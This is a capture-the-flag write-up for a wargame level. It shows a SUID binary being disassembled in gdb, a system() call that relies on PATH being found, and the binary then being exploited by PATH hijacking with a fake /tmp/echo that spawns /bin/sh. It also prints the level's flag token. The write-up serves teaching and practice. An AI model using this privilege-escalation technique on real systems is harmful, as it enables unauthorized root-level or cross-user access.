# Level03

### 1. Identity

	$ id
	uid=2003(level03) gid=2003(level03) groups=2003(level03),100(users)

We are logged as **level03**.

### 2. Home directory

	$ pwd
	/home/user/level03

	$ ls -la
	...
	-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
	...

All files here are standard shell configuration files (.bashrc, .profile, etc.) with no exploitable content except for one : **level03**.

It is a SUID binary owned by flag03. Executing it gives :

	$ ./level03 
	Exploit me

### 3. First look at the binary

Running **strings** or **nm** on the ELF gives us useful information:

	...
	setresgid
	setresuid
	system
	getegid
	geteuid
	...

These functions are typical indicators of privilege manipulation inside the program (switching UID/GID, then calling system()).

This tells us the binary will probably execute a system command with elevated permissions — perfect scenario for exploitation.

To understand what happens, we load the binary into gdb.

*(This challenge is similar to the first RootMe scripting challenge.)*

### 4. Exploiting the ELF

**Doc :**

https://www.thehacker.recipes/infra/privilege-escalation/unix/suid-sgid-binaries

We start by opening the binary in gdb :

	$ gdb ./level03

Inside gdb :

	(gdb) disas main

This gives the following disassembly:

	Dump of assembler code for function main:
	0x080484a4 <+0>:	push   %ebp
	0x080484a5 <+1>:	mov    %esp,%ebp
	0x080484a7 <+3>:	and    $0xfffffff0,%esp
	0x080484aa <+6>:	sub    $0x20,%esp
	0x080484ad <+9>:	call   0x80483a0 <getegid@plt>
	0x080484b2 <+14>:	mov    %eax,0x18(%esp)
	0x080484b6 <+18>:	call   0x8048390 <geteuid@plt>
	0x080484bb <+23>:	mov    %eax,0x1c(%esp)
	0x080484bf <+27>:	mov    0x18(%esp),%eax
	0x080484c3 <+31>:	mov    %eax,0x8(%esp)
	0x080484c7 <+35>:	mov    0x18(%esp),%eax
	0x080484cb <+39>:	mov    %eax,0x4(%esp)
	0x080484cf <+43>:	mov    0x18(%esp),%eax
	0x080484d3 <+47>:	mov    %eax,(%esp)
	0x080484d6 <+50>:	call   0x80483e0 <setresgid@plt>
	0x080484db <+55>:	mov    0x1c(%esp),%eax
	0x080484df <+59>:	mov    %eax,0x8(%esp)
	0x080484e3 <+63>:	mov    0x1c(%esp),%eax
	0x080484e7 <+67>:	mov    %eax,0x4(%esp)
	0x080484eb <+71>:	mov    0x1c(%esp),%eax
	0x080484ef <+75>:	mov    %eax,(%esp)
	0x080484f2 <+78>:	call   0x8048380 <setresuid@plt>
	0x080484f7 <+83>:	movl   $0x80485e0,(%esp)
	0x080484fe <+90>:	call   0x80483b0 <system@plt>
	0x08048503 <+95>:	leave  
	0x08048504 <+96>:	ret    
	End of assembler dump.

### 5. Identifying the vulnerability

The most interesting part is the call to system() :

	0x080484fe <+90>:	call   0x80483b0 <system@plt>

Just before the call, we see :

	0x080484f7 <+83>:	movl   $0x80485e0,(%esp)

This means the program calls :

	system((char *)0x80485e0)

### 6. Inspecting the system() argument

In gdb :

	(gdb) x/s 0x80485e0

This gives us the argument used :

	0x80485e0:	 "/usr/bin/env echo Exploit me"

**➡️ The binary executes a system command without specifying an absolute path for the executable.**

system() invokes /bin/sh -c \<command\>.

If \<command\> contains a program name without a path, it will search through $PATH.

This allows a **PATH hijacking**.

### 7. Exploitation

#### A. Create a malicious file
```
$ echo '/bin/sh' > /tmp/echo
$ chmod +x /tmp/echo
```

#### B. Modify PATH:
```
$ export PATH=/tmp:$PATH
```

#### C. Run the binary:
```
$ ./level03
```

### 8. Getting the flag

Inside of our new shell :

	$ getflag
	Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

Flag successfully retrieved.